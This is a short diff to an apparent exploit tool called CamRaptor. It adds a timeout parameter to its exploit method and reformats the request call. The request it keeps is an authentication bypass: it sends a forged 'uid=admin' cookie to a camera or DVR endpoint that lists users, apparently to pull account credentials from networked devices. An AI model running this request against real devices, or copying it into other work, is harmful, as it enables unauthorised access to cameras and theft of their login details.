@@ -30,13 +30,17 @@ import requests
 
 class CamRaptor:
     @staticmethod
-    def exploit(address):
+    def exploit(address, timeout=3):
         try:
             cookies = {
                 "uid": "admin"
             }
 
-            response = requests.get(f"http://{address}/device.rsp?opt=user&cmd=list", cookies=cookies, verify=False, timeout=3)
+            response = requests.get(f"http://{address}/device.rsp?opt=user&cmd=list",
+                                    cookies=cookies,
+                                    verify=False,
+                                    timeout=timeout
+                                   )
         except Exception:
             return None
 
